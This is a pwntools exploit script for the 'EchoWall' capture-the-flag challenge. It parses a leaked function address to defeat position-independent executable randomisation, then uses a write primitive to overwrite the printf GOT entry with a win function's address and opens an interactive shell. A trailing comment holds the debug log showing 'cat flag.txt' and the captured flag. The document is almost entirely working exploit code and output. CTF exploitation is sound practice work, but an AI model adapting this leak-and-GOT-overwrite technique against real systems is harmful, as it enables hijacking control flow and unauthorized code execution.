from pwn import * 


#p = remote("chal.firebird.sh", 35026)
#p = process("./EchoWall")

p = remote("chal.firebird.sh", 35027)
context.log_level = 'debug'
elf = ELF("./EchoWall")
#s = 'b * UwU_main+212'
#gdb.attach(p, s)
p.recvuntil(b"0x")
PrintWall_addr = int(b'0x' + p.recvuntil(b'|', drop = True), 16)
#print(PrintWall_addr)
PrintWall_offset = 0x12b7
UwU_win_offset = 0x12a0

#elf.address = PrintWall_addr - elf.sym['print_wall']
base_addr = PrintWall_addr - PrintWall_offset

UwU_win_addr = base_addr + UwU_win_offset
putsplt = base_addr + (elf.symbols['puts'])
printf_addr = base_addr + elf.got['printf']

log.info("PrintWall_addr:" + hex(PrintWall_addr))
log.info("base address:" + hex(elf.address))
p.sendlineafter(b'> ', b'2')


p.sendlineafter(b'> ', b'1')
#p.recvuntil("Where do you want to write? ヽ( ^ω^ ゞ )\n> ")
p.sendafter(b'> ', p64(printf_addr))
p.sendafter(b'> ', p64(UwU_win_addr))
p.interactive()
'''
p.recvuntil("ヽ( ^ω^ ゞ )\n> ")
#print(hex(elf.symbols['puts']))
# print(hex(elf.got['puts']))
p.sendline(p64(printf_addr))

p.recvuntil("b'The message is: ")
puts_addr = int(p.recvuntil(b" ", drop = True), 16)
print(puts_addr)
p.interactive()
'''
#print(printf_addr)
#print(elf.got['printf'])
'''

p.sendafter(b'> ', p64(printf_addr))
p.sendafter(b'> ', p64(UwU_win_addr))
'''


p.interactive()


'''
    b'flag.txt\n'
EchoWall
flag.txt
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[DEBUG] Received 0x4e bytes:
    b'flag{y0u_5h0u7_700_l0ud...5h0u7_700_l0ud...700_l0ud...l0ud...0ud...ud...d...}\n'
flag{y0u_5h0u7_700_l0ud...5h0u7_700_l0ud...700_l0ud...l0ud...0ud...ud...d...}

'''